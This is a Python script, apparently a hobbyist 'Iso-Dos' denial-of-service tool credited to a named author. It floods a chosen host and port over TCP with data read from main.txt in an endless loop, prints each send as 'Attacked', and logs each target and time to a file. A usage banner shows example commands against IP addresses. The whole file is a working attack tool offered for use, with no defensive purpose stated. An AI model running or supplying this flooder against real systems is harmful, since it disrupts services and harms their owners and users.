# ISO HACKED ✓
import socket
import random
import sys
import os
import datetime
def __build__(__nameF_Status__):
	fw_Not=os.path.exists(__nameF_Status__)
	if(fw_Not == False):
		print('Error Please Start setup.py <python3 setup.py>')
		sys.exit()
def __setups_Py(__setupexit__):
	mod_Testing=os.path.exists(__setupexit__)
	if(mod_Testing == False):
		print('Error') 
		sys.exit()
def __os_mkdir_data__(__mkdirs__):
	__Testings__=os.path.exists(__mkdirs__)
	if(__Testings__ == False):
		os.mkdir('data')
W  = '\33[0m'
R  = '\33[1;31m'
G  = '\33[1;32m'
O  = '\33[1;33m'
B  = '\33[1;34m'
P  = '\33[1;35m'
C  = '\33[1;36m'
GR = '\33[1;37m'
def baytests():
	baytests_list_rusc=[
	"#\xd2=\xc1\xe6U%&",
	"#\xd2=\xc1\xe6U%&",
	"#\xd2=\xc1\xe6U%&",
	"#\xd2=\xc1\xe6U%&",
	"xcb\xb9\xe0\xab!\x86\xfe\xa3\x8bU\x0c\xae\xb3\xb9\x87\xe4z\xa0xxx",
	"xcb\xb9\xe0\xab!\x86\xfe\xa3\x8bU\x0c\xae\xb3\xb9\x87\xe4z\xa0xxx",
	"e\xfa\x14\x02\xf44\xfb\x08\xe4\x04\xd0I\x97\x94\xcb\xb9\xe0\xab!sx",
	"e\xfa\x14\x02\xf44\xfb\x08\xe4\x04\xd0I\x97\x94\xcb\xb9\xe0\xab!xe",
	"e\xb6B1\x96m!\xf4LH\xad\xd3\xc69\xfc:/\x98\xefn\xd5\x93\x813tWxs"
	]
def Automatic(host,port):
	c=0
	Cal=0
	while True:
		Cal+=1
		c+=1
		list=[1234444,288393,38192,39292,192929,78118,29199,39229,22222,48382,1011,39299,21093,999382,888888,777777,666666,5555555,444444,3333333,2222222,11111111,8888888,777188,918288,3818128,282883,4483887,783838,928838,4838848,5493384,3828448,99494994,3828282,281888,4882883,48282884,4838538,6786464,646499,313767,2226464,33764646,5766767,67616168,6761138,697979,998676,76777764,764664,6464343,11111,2323161,4676767,13914]
		num=random.choice(list)
		pro=int(num)
		if c == 100:
			c=0
			Num='123456789'
			Ran=[2,3,4,5,6,7,8,9]
			fina=random.choice(Ran)
			ran=str(''.join(random.choice(Num)for i in range(fina)))
			pro=int(ran)
		pro=int(pro)
		serv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		serv.connect((host,port))
		file=open('main.txt','r')
		rebot=file.read(int(pro))
		rebot=rebot.encode()
		size=len(rebot)
		serv.send(rebot)
		print(P+'Attacked'+R+':'+G+str(Cal)+R+':Host:'+W+host+R+':Port:'+W+str(port)+':'+R+'Size:'+W+str(size))

def payload(host,port,dump):
	c=0
	while True:
		c+=1
		serv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		serv.connect((host,port))
		file=open('main.txt','r')
		rebot=file.read(dump)
		rebot=rebot.encode()
		size=len(rebot)
		serv.send(rebot)
		print(P+'Attacked'+R+':'+G+str(c)+R+':Host:'+W+host+R+':Port:'+W+str(port)+':'+R+'Size:'+W+str(size))

if __name__ == '__main__':
	__printf_status_setup__='setup.py'
	__exit_status_Files__="main.txt"
	__build__(__exit_status_Files__)
	__setups_Py(__printf_status_setup__)
	__mkdirs_data_Tolls_ip__='data'
	__os_mkdir_data__(__mkdirs_data_Tolls_ip__)
try:
	
	if sys.argv[1] == '-h':
		host=str(sys.argv[2])
	if sys.argv[3] == '-p':
		port=int(sys.argv[4])
	if sys.argv[5] == '-d':
		if sys.argv[6] == 'auto':
			try:
				times=datetime.datetime.now()
				file_data=open('data/Datas.txt','a')
				__data__=f"Host: {host} Port: {port} Time: {times}"
				file_data.write(__data__+'\n')
				
				print(R+'Exit CTRL ^C')
				Automatic(host,port)
			except:
				print('Close')
		else:
			dump=int(sys.argv[6])
			try:
				times=datetime.datetime.now()
				file_data=open('data/Datas.txt','a')
				__data__=f"Host: {host} Port: {port} Time: {times}"
				file_data.write(__data__+'\n')

				print(R+'Exit CTRL ^C')
				payload(host,port,dump)
			except:
				print('Close')

except:
	print(W+'''
    -h <host> 
    -p <port>
    -d <Namber Packet> or <auto>
    #Example1: 
        python3 Iso-Dos.py -h 123.232.1.1 -p 80 -d auto
    #Example2:
        python3 Iso-Dos.py -h 123.232.1.5 -p 80 -d 50000
    -------------------------------------------------------
    [coding bay issam iso]
    Github : https://github.com/issamiso
    Facebook : facebook.com/profile.php?id=100089638764935
 ''')